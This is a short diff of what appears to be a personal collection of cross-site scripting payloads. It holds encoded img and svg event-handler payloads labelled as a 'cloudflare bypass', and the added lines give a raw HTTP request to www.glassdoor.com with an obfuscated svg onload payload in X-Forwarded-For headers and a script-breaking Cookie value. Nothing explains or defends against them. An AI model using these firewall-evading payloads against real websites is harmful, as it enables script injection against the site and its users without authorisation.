@@ -21,3 +21,11 @@ _=&clientid=1&campaignid=1&status=available%22%3E%3Cimg%20src=1%20onerror=alert(
 cloudflare bypass
 Dec: <svg onload=prompt%26%230000000040document.domain)>
 Hex: <svg onload=prompt%26%23x000000028;document.domain)>
+
+
+GET /member/home/index.htm/x.jpeg?t=2021111121 HTTP/2
+Host: www.glassdoor.com
+X-Forwarded-For: xss 
+X-Forwarded-For: xss><svg/onload=globalThis[`al`+/ert/.source]`1`// 
+X-Forwarded-For: > 
+Cookie: gdId=xss</script%20
